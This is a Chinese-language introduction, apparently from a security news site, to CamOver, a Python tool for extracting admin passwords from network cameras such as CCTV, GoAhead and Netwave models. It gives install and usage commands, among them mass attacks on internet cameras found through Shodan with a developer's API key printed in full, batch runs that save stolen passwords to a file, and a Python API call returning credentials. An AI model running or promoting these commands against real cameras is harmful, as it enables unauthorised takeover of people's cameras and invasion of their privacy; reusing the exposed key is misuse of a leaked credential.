![](https://image.3001.net/images/20210717/1626454700_60f1baac042fa8390f8b6.jpg!small)

## 关于CamOver

CamOver是一款功能强大的摄像头漏洞利用工具，在该工具的帮助下，广大研究人员可以轻松破解掉你家网络摄像头的管理员密码，并接管你的摄像头。

## 功能介绍

> 该工具能够发现并利用大多数主流型号网络摄像头中的安全漏洞，例如CCTV、GoAhead和Netwave等。
>
> 经过优化，支持多线程同时攻击多个摄像头。
>
> 简单的命令行接口和API用法。

## 工具安装

由于CamOver使用Python3开发，因此首先需要在本地设备上安装并配置好Python3环境。接下来，广大研究人员可以使用下列命令下载并安装CamOver：

    
    
    pip3 install git+https://github.com/EntySec/CamOver

## 基础使用

CamOver的使用非常简单，我们只需要在命令行终端中输入“camover”命令即可使用CamOver：

    
    
    usage: camover [-h] [-t] [-o OUTPUT] [-i INPUT] [-a ADDRESS] [--shodan SHODAN]
    
                   [--zoomeye ZOOMEYE] [-p PAGES]
    
     
    
    CamOver is a camera exploitation tool that allows to disclosure network camera
    
    admin password.
    
     
    
    optional arguments:
    
      -h, --help            显示这个帮助信息并退出
    
      -t, --threads          启用多线程模式以获得更好的性能
    
      -o OUTPUT, --output OUTPUT
    
                            将结果存储至文件
    
      -i INPUT, --input INPUT
    
                            地址输入文件
    
      -a ADDRESS, --address ADDRESS
    
                            提供单个地址
    
      --shodan SHODAN       通过网络利用远程设备所使用的Shodan API密钥
    
      --zoomeye ZOOMEYE     通过网络利用远程设备所使用的ZoomEye API密钥
    
      -p PAGES, --pages PAGES
    
                            需要通过ZoomEye获取的页面数量

## 工具使用样例

### 攻击单个摄像头

下列命令可以攻击单个网络摄像头：

    
    
    camover -a 192.168.99.100

### 通过网络攻击远程摄像头

接下来，我们可以使用Shodan搜索引擎来搜索并攻击网络上的摄像头，此时我们可以使用-t参数来设置多线程数量以获得更好的性能：

    
    
    camover -t --shodan PSKINdQe1GyxGgecYz2191H2JoS9qvgD

 **注意：** 项目中给出的Shodan
API密钥（PSKINdQe1GyxGgecYz2191H2JoS9qvgD）是开发人员自己的专业版API密钥，你可以使用你自己的密钥，当然了你想用开发人员的也没意见，大家资源共享嘛！

### 从输入文件获取目标摄像头

我们还可以使用开放数据库中提供的摄像头地址，此时我们可以使用-t参数来设置多线程数量以获得更好的性能：

    
    
    camover -t -i cameras.txt -o passwords.txt

 **注意：** 此命令将会攻击cameras.txt中给出的所有摄像头，并会将所有获取到的密码存储至passwords.txt文件中。

## API使用

CamOver还提供了自己的Python API，可以将其导入至你们自己的项目代码中并调用其功能：

    
    
    from camover import CamOver

### 调用样例

 **攻击单个摄像头：**

    
    
    from camover import CamOver
    
     
    
    camover = CamOver()
    
    creds = camover.exploit('192.168.99.100')
    
     
    
    print(creds)

## 项目地址

 **CamOver：** 【[ _GitHub传送门_](https://github.com/EntySec/CamOver)】

